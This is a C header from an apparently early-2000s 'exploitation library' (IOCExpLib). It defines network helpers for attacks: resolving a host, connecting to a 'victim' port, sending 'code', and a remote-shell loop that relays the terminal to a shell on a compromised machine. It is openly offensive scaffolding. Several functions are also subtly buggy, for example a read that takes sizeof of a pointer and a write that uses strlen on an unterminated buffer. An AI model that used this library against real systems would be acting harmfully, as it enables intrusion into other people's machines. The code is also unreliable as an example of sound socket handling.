/*
 *  IOCExpLib.h - by IOC - www.ioc.fr.st
 *  Version: IOCExpLib v1.0a Beta - 06/03
 *  File name: IOCEL_network.h 
 *  Description: includes network exploitation functions
 *  Contact me - Li0n7@voila.fr
 *
 */





#ifndef __IOCEL_NETWORK_H
#define __IOCEL_NETWORK_H





#define VERBOSE
#define SIZE_MAX   1024






u_long
IOCExpLib_resolve_host(u_char *host_name)
{
      struct in_addr addr;
      struct hostent *host_ent;

      addr.s_addr = inet_addr(host_name);
      if (addr.s_addr == -1)
      {
          host_ent = gethostbyname(host_name);
          if (!host_ent) return(0);
          memcpy((char *)&addr.s_addr, host_ent->h_addr,host_ent->h_length);
      }

      return(addr.s_addr);
}











int
IOCExpLib_connect(unsigned long victim, int port)
{
      struct sockaddr_in sockaddr;
      struct hostent *host;
      int fd;

      if (port > 65535)
      {
          fprintf(stderr, "[-] Port to connect to must be < 65535\n");
          return -1;
      }

      fd = socket(AF_INET, SOCK_STREAM, 0);

      if ( fd == -1 )
      {
          fprintf(stderr, "%s: socket()\n", strerror(errno));
          return -1;
      }

      sockaddr.sin_family = AF_INET;
      sockaddr.sin_addr.s_addr = victim;
      sockaddr.sin_port = htons(port);

      if(connect(fd, (struct sockaddr *)&sockaddr, sizeof sockaddr) == -1)
      {
          fprintf(stderr, "[-] %s: connect()\n", strerror(errno));
          return -1;
      }

      fprintf(stdout, "[+] Connected!\n");

      return fd;
}











int
IOCExpLib_send(int fd, char *buffer)
{
      if (buffer == NULL)
      {
          fprintf(stderr, "[-] No data to send\n");
          return -1;
      }

      if((send(fd, buffer, strlen(buffer)+1, 0)) == -1)
      {
          fprintf(stderr, " [-] %s: send()\n", strerror(errno));
          return -1;
      }

      fprintf(stdout, "[+] Sending code %s\n", buffer);

      return 0;
}











int 
IOCExpLib_write(int fd, char *buffer)
{  
      int res;
      res = write(fd, buffer, strlen(buffer));
      return res;
}










int 
IOCExpLib_read(int fd, char buffer[SIZE_MAX])
{
      int res;
      res = read(fd, buffer, sizeof(buffer));
      return res;
}










int
IOCExpLib_remote_shell(int fd)
{
      u_char sock_buf[4096];
      fd_set fds;

      for (;;)
      {
          FD_ZERO(&fds);
          FD_SET(0, &fds);
          FD_SET(fd, &fds);

          if (select(255, &fds, NULL, NULL, NULL) == -1)
          {
              perror("select");
              close(fd);
              exit(-1);
          }

          memset(sock_buf, 0, sizeof(sock_buf));

          if (FD_ISSET(fd, &fds))
          {
              if (recv(fd, sock_buf, sizeof(sock_buf), 0) ==-1)
              {
                  fprintf(stderr, "[-] Connection close by remote host\n");
                  close(fd);
                  exit(0);
              }

              fprintf(stderr, "%s", sock_buf);
          }

          if (FD_ISSET(0, &fds))
          {
              read(0, sock_buf, sizeof(sock_buf));
              write(fd, sock_buf, strlen(sock_buf));
          }
      }

      return 0;
}












void 
IOCExpLib_close(int fd)
{
      int res;
      res = close(fd);
}



#endif
























